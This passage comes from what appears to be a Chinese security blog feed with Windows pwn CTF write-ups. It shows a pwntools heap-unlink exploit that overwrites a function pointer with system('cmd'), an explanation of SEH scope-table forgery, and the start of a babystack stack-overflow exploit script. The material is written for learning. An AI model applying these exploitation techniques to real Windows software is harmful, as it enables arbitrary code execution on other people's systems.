class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">   printString(<span class="string">&quot;index &gt;&quot;</span>);</span><br><span class="line">   <span class="built_in">scanf</span>(<span class="string">&quot;%ud&quot;</span>, (<span class="type">char</span>)editIndexBuffer);</span><br><span class="line">   getchar();</span><br><span class="line">   <span class="keyword">if</span> ( *(_DWORD *)editIndexBuffer &gt;= <span class="number">0x10</span>u )</span><br><span class="line">     <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">   entryOffset = *(_DWORD *)editIndexBuffer;</span><br><span class="line">   <span class="keyword">if</span> ( !MyHeapEntry_0[*(_DWORD *)editIndexBuffer].heap_addr )</span><br><span class="line">     <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">   printString(<span class="string">&quot;content  &gt;&quot;</span>);</span><br><span class="line">   contentIndex = <span class="number">0</span>;</span><br><span class="line">   heapProperties = MyHeapEntry_0[entryOffset].func_ptr;</span><br><span class="line">   contentAddress = MyHeapEntry_0[entryOffset].heap_addr;</span><br><span class="line">   contentSize = <span class="number">16</span> * ((<span class="type">unsigned</span> __int8)heapProperties &amp; <span class="number">0xF</span>);</span><br><span class="line">   inputChar = getchar();</span><br><span class="line">   <span class="keyword">if</span> ( inputChar != <span class="number">10</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">do</span></span><br><span class="line">     &#123;</span><br><span class="line">       contentAddress[contentIndex] = inputChar;</span><br><span class="line">       <span class="keyword">if</span> ( ++contentIndex == contentSize - <span class="number">1</span> )</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       inputChar = getchar();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">while</span> ( inputChar != <span class="number">10</span> );</span><br><span class="line">     printString = (<span class="type">void</span> (__cdecl *)(<span class="type">const</span> <span class="type">char</span> *))<span class="built_in">puts</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   contentAddress[contentIndex] = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><p>edit操作，Size会多乘以0x10，因此是有个堆溢出的漏洞的</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>因为开了<code>ASLR</code>，先想的是通过<code>free</code>后的<code>Flink</code>来泄露<code>heap_base</code>，会发现其实存储每一个堆条目信息的，也是存储在heap上的，因此就可以打unlink辣</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">p = run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option &gt;\r\n&#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size &gt;\r\n&#x27;</span>,tbs(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index &gt;\r\n&#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index &gt;\r\n&#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index &gt;\r\n&#x27;</span>,tbs(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;content  &gt;\r\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">32</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">32</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">32</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u32(ru(<span class="string">b&quot;\r\n&quot;</span>, drop=<span class="literal">True</span>)[:<span class="number">4</span>])-<span class="number">0x550</span></span><br><span class="line"></span><br><span class="line">leak(<span class="string">&quot;heap_base&quot;</span>,heap_base)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p32(heap_base+<span class="number">0x4A4</span>-<span class="number">4</span>)+p32(heap_base+<span class="number">0x4A4</span>))</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">pause()</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">image_base=u32(ru(<span class="string">b&quot;\r\n&quot;</span>, drop=<span class="literal">True</span>)[:<span class="number">4</span>])-<span class="number">0x1043</span></span><br><span class="line">leak(<span class="string">&quot;image_base&quot;</span>,image_base)</span><br><span class="line"></span><br><span class="line">puts_iat = image_base + <span class="number">0x20c4</span></span><br><span class="line">edit(<span class="number">1</span>, p32(puts_iat)+p32(<span class="number">0</span>)+p32(heap_base+<span class="number">0x4A4</span>));show(<span class="number">1</span>)             </span><br><span class="line">ucrt_base = u32(r(<span class="number">4</span>))-<span class="number">0xb89f0</span></span><br><span class="line">log.warn(<span class="string">&quot;ucrt_base:&quot;</span> + <span class="built_in">hex</span>(ucrt_base))</span><br><span class="line">system = ucrt_base+<span class="number">0xefda0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify func pointer to system and tigger it</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;cmd\x00&#x27;</span>)                                             </span><br><span class="line">edit(<span class="number">2</span>, p32(system)+p32(heap_base+<span class="number">0x6D0</span>))                         </span><br><span class="line">show(<span class="number">0</span>)                                                          </span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><blockquote><p>不过我在书写脚本的时候，发现unlink的时候，得在x32dbg附加调试才能过得去free（不知道为什么）</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.slideshare.net/slideshow/windows-10-nt-heap-exploitation-chinese-version/154047090">angel boy</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/07/09/winpwn/">xuanxuanblingbling</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;windows堆基础知识&quot;&gt;&lt;a href=&quot;#windows堆基础知识&quot; class=&quot;headerlink&quot; title=&quot;windows堆基础知识&quot;&gt;&lt;/a&gt;windows堆基础知识&lt;/h2&gt;&lt;p&gt;win10的memory allocator基本上分为两种：</summary>
      
    
    
    
    <category term="windows" scheme="http://s1nec-1o.github.io/categories/windows/"/>
    
    <category term="heap" scheme="http://s1nec-1o.github.io/categories/windows/heap/"/>
    
    
    <category term="windows pwn" scheme="http://s1nec-1o.github.io/tags/windows-pwn/"/>
    
  </entry>
  
  <entry>
    <title>windows pwn初探(1)</title>
    <link href="http://s1nec-1o.github.io/2025/05/08/windows-pwn%E5%88%9D%E6%8E%A2-1/"/>
    <id>http://s1nec-1o.github.io/2025/05/08/windows-pwn%E5%88%9D%E6%8E%A2-1/</id>
    <published>2025-05-08T06:27:53.000Z</published>
    <updated>2025-05-10T07:19:40.999Z</updated>
    
    <content type="html"><![CDATA[<h1 id="window-pwn"><a href="#window-pwn" class="headerlink" title="window_pwn"></a>window_pwn</h1><p><a href="https://www.anquanke.com/post/id/188170#h3-1">https://www.anquanke.com/post/id/188170#h3-1</a></p><h2 id="SEH相关数据结构"><a href="#SEH相关数据结构" class="headerlink" title="SEH相关数据结构"></a>SEH相关数据结构</h2><h3 id="TIB结构"><a href="#TIB结构" class="headerlink" title="TIB结构"></a>TIB结构</h3><p><code>TIB</code>，即线程信息块，是保存线程基本信息的数据结构，它位于<code>TEB</code>的头部。<code>TEB</code>是操作系统为了保存每个线程的数据创建的，每个线程都有自己的<code>TEB</code>。</p><p>TIB结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Exceptionlist</span>;</span><span class="comment">//指向异常处理链表</span></span><br><span class="line">    PVOID StackBase;<span class="comment">//当前进程所使用的栈的栈底</span></span><br><span class="line">    PVOID StackLimit;<span class="comment">//当前进程所使用的栈的栈顶</span></span><br><span class="line">    PVOID SubSystemTib;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PVOID FiberData;</span><br><span class="line">        ULONG Version;</span><br><span class="line">    &#125;;</span><br><span class="line">    PVOID ArbitraryUserPointer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span><span class="comment">//指向TIB结构自身</span></span><br><span class="line">&#125; NT_TIB;</span><br></pre></td></tr></table></figure><p>在这个结构中与异常处理有关的第一个成员：指向<code>_EXCEPTION_REGISTRATION_RECORD</code>结构的<code>Exceptionlist</code>指针</p><h3 id="EXCEPTION-REGISTRATION-RECORD-结构"><a href="#EXCEPTION-REGISTRATION-RECORD-结构" class="headerlink" title="_EXCEPTION_REGISTRATION_RECORD 结构"></a>_EXCEPTION_REGISTRATION_RECORD 结构</h3><p>该结构主要用于描述线程异常处理过程的地址，该结构的链表描述了多个线程异常处理过程的层次关系</p><p>结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span><span class="comment">//指向下一个结构的指针</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;<span class="comment">//当前异常处理回调函数的地址</span></span><br><span class="line">&#125;EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><p>结构如图所示：</p><img src="https://s2.ax1x.com/2019/10/09/uI9Auq.png" alt="img" style="zoom: 67%;" /><p>格式化之后的这个结构体中的<code>*Next</code>必须是原来的，所以我们要事先泄露出来原<code>*Next</code></p><h3 id="SEH范围表结构"><a href="#SEH范围表结构" class="headerlink" title="SEH范围表结构"></a>SEH范围表结构</h3><p>在Scope表中保存了<code>__try</code>块相匹配的<code>__except</code>或<code>__finally</code>的地址值<br>结构如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_EH4_SCOPETABLE</span> &#123;</span><br><span class="line">        DWORD GSCookieOffset;</span><br><span class="line">        DWORD GSCookieXOROffset;</span><br><span class="line">        DWORD EHCookieOffset;</span><br><span class="line">        DWORD EHCookieXOROffset;</span><br><span class="line">        _EH4_SCOPETABLE_RECORD ScopeRecord[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_EH4_SCOPETABLE_RECORD</span> &#123;</span><br><span class="line">        DWORD EnclosingLevel;</span><br><span class="line">        <span class="built_in">long</span> (*FilterFunc)();</span><br><span class="line">            <span class="keyword">union</span> &#123;</span><br><span class="line">            <span class="built_in">void</span> (*HandlerAddress)();</span><br><span class="line">            <span class="built_in">void</span> (*FinallyFunc)(); </span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>windows pwn的关键就是伪造<code>scope table</code>结构体，它的地址位于栈上的位置在<code>ebp-0x8</code>，存入的值是和<code>___security_cookie</code>异或者之后的结果，所以我们伪造它，就必须先泄露出来<code>___security_cookie</code>的值</p><p>当程序触发异常后，会执行类似这样的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00401B50                 push    ebp</span><br><span class="line">.text:00401B51                 mov     ebp, esp</span><br><span class="line">.text:00401B53                 mov     eax, [ebp+arg_C]</span><br><span class="line">.text:00401B56                 push    eax</span><br><span class="line">.text:00401B57                 mov     ecx, [ebp+arg_8]</span><br><span class="line">.text:00401B5A                 push    ecx</span><br><span class="line">.text:00401B5B                 mov     edx, [ebp+arg_4]</span><br><span class="line">.text:00401B5E                 push    edx</span><br><span class="line">.text:00401B5F                 mov     eax, [ebp+arg_0]</span><br><span class="line">.text:00401B62                 push    eax</span><br><span class="line">.text:00401B63                 push    offset j_@__security_check_cookie@4 ; __security_check_cookie(x)</span><br><span class="line">.text:00401B68                 push    offset ___security_cookie</span><br><span class="line">.text:00401B6D                 call    _except_handler4_common</span><br><span class="line">.text:00401B72                 add     esp, 18h</span><br><span class="line">.text:00401B75                 pop     ebp</span><br><span class="line">.text:00401B76                 retn</span><br><span class="line">.text:00401B76 SEH_4013A0      endp</span><br></pre></td></tr></table></figure><p>调用了<code>_except_handler4_common</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl _except_handler4_common(<span class="type">unsigned</span> <span class="type">int</span> *securityCookies, <span class="type">void</span> (__fastcall *cookieCheckFunction)(<span class="type">unsigned</span> <span class="type">int</span>), _EXCEPTION_RECORD *exceptionRecord, <span class="type">unsigned</span> __int32 sehFrame, _CONTEXT *context)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 异或解密 scope table</span></span><br><span class="line">    scopeTable_1 = (_EH4_SCOPETABLE *)(*securityCookies ^ *(_DWORD *)(sehFrame + <span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sehFrame 等于 上图 ebp - 10h 位置, framePointer 等于上图 ebp 的位置</span></span><br><span class="line">    framePointer = (<span class="type">char</span> *)(sehFrame + <span class="number">16</span>);</span><br><span class="line">    scopeTable = scopeTable_1;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证 GS</span></span><br><span class="line">    ValidateLocalCookies(cookieCheckFunction, scopeTable_1, (<span class="type">char</span> *)(sehFrame + <span class="number">16</span>));</span><br><span class="line">    __except_validate_context_record(context);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( exceptionRecord-&gt;ExceptionFlags &amp; <span class="number">0x66</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        exceptionPointers.ExceptionRecord = exceptionRecord;</span><br><span class="line">        exceptionPointers.ContextRecord = context;</span><br><span class="line">        tryLevel = *(_DWORD *)(sehFrame + <span class="number">12</span>);</span><br><span class="line">        *(_DWORD *)(sehFrame - <span class="number">4</span>) = &amp;exceptionPointers;</span><br><span class="line">        <span class="keyword">if</span> ( tryLevel != <span class="number">-2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                v8 = tryLevel + <span class="number">2</span> * (tryLevel + <span class="number">2</span>);</span><br><span class="line">                filterFunc = (<span class="type">int</span> (__fastcall *)(_DWORD, _DWORD))*(&amp;scopeTable_1-&gt;GSCookieXOROffset + v8);</span><br><span class="line">                scopeTableRecord = (_EH4_SCOPETABLE_RECORD *)((<span class="type">char</span> *)scopeTable_1 + <span class="number">4</span> * v8);</span><br><span class="line">                encloseingLevel = scopeTableRecord-&gt;EnclosingLevel;</span><br><span class="line">                scopeTableRecord_1 = scopeTableRecord;</span><br><span class="line">                <span class="keyword">if</span> ( filterFunc )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 调用 FilterFunc</span></span><br><span class="line">                    filterFuncRet = _EH4_CallFilterFunc(filterFunc);</span><br><span class="line">                    ......</span><br><span class="line">                    <span class="keyword">if</span> ( filterFuncRet &gt; <span class="number">0</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        ......</span><br><span class="line">                        <span class="comment">// 调用 HandlerFunc</span></span><br><span class="line">                        _EH4_TransferToHandler(scopeTableRecord_1-&gt;HandlerFunc, v5 + <span class="number">16</span>);</span><br><span class="line">                        ......</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ......</span><br><span class="line">                tryLevel = encloseingLevel;</span><br><span class="line">                <span class="keyword">if</span> ( encloseingLevel == <span class="number">-2</span> )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                scopeTable_1 = scopeTable;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在函数中前置调用了<code>scope table</code>结构体中的<code>FilterFunc</code>函数和<code>HandlerFunc</code>函数，那么我们就可以将这两个函数地址复制为我们的shell代码，当触发异常时就会执行shell代码，即可获取到shell</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>通过查看我们发现在栈上还有一个特殊的值，位置在<code>ebp-0x1c</code>处</p><p><img src="https://s2.ax1x.com/2019/10/09/uIFey9.png" alt="img"></p><p>而<code>scope table</code>结构体地址在它的下面，所以我们必须还要格式化这个值。格式化它由两种方法组成，第一种消耗掉出去，构造payload的时候再填充进去即可；另一种方法就是计算出来：<code>值=___security_cookie^ebp</code></p><blockquote><p>感觉说这么多理论的也不是很能理解，遂做点题来理解理解</p><p>不过在64位下的SEH结构体就不在栈上了，利用会更加困难</p></blockquote><h2 id="window下ASLR的脆弱性："><a href="#window下ASLR的脆弱性：" class="headerlink" title="window下ASLR的脆弱性："></a>window下ASLR的脆弱性：</h2><p><a href="https://www.morphisec.com/blog/aslr-what-it-is-and-what-it-isnt/">https://www.morphisec.com/blog/aslr-what-it-is-and-what-it-isnt/</a></p><ol><li>DLL的基地址基于启动时随机化，DLL的基地址只在系统启动时会随机化，因此只需结合内存泄露或暴力破解等漏洞即可利用</li><li>ASLR不提供有关攻击的信息、发生攻击时ASLR不会发出警报</li><li>地址空间布局随机化 (ASLR) 旨在阻止攻击可靠地到达其目标内存地址。ASLR 的重点并非在于捕获攻击，而是在于使攻击难以得逞。</li><li>如果可执行文件或 DLL 文件未启用 ASLR 支持，则不支持ASLR。</li></ol><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505081433006.png" alt="image-20250506202655846"></p><p>程序中有着10次的泄露数据，以及给了main和栈的地址，并且有着一个栈溢出的漏洞</p><p>因此考虑覆盖SEH结构体以达到getshell的目的</p><p>攻击流程：</p><ul><li><p>泄露<code>__security_cookie</code>，他的地址是<code>main_addr+0x2f54</code>；然后泄露<code>_EXCEPTION_REGISTRATION_RECORD</code>结构体中<code>Next</code>成员，通过x32dbg调试可以发现在ebp-0x10的位置就是next字段</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505081433007.png" alt="image-20250506214348433" style="zoom:33%;" /><p>可以看到这个<code>RECORD</code>结构体是存储在栈上的；然后看到ED0的位置，便是GS即<code>ebp-0x1c</code>的位置</p></li><li><p>格式<code>hardler</code>结构体</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SEH_scope_table = p32(<span class="number">0x0FFFFFFE4</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFF20</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFFFE</span>)</span><br><span class="line">SEH_scope_table += p32(shell_addr)</span><br></pre></td></tr></table></figure><ul><li>通过栈溢出对内存进行覆盖，使程序异常来触发执行原始的代码段（访问非法内存之类的，理论上来说我可以把返回地址填满<code>null</code>，那么<code>0x0000000</code>处无法访问，会触发<code>SHE</code>；但是这题可以直接访问非法的内存）</li></ul><p>这里有个比较容易出错的点就是在v9一开始的4个字节之后会被覆盖，因此要先用<code>b&#39;aaaa&#39;</code>填充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># context(os=&#x27;linux&#x27; , arch=&#x27;amd64&#x27; , log_level=&#x27;debug&#x27;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">path=<span class="string">&#x27;./babystack.exe&#x27;</span></span><br><span class="line"><span class="comment"># elf=ELF(path)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># amd64shell=b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"><span class="comment"># ae64 = AE64()</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n     :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line">fmt =<span class="keyword">lambda</span> string:<span class="built_in">eval</span>(<span class="string">f&quot;f&#x27;&#x27;&#x27;<span class="subst">&#123;string&#125;</span>&#x27;&#x27;&#x27;&quot;</span>, <span class="built_in">globals</span>()).encode()</span><br><span class="line">r64 =<span class="keyword">lambda</span>                         :u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#fmt(&#x27;%&#123;one_gadget &amp; 0xffff&#125;c&#x27;)</span></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        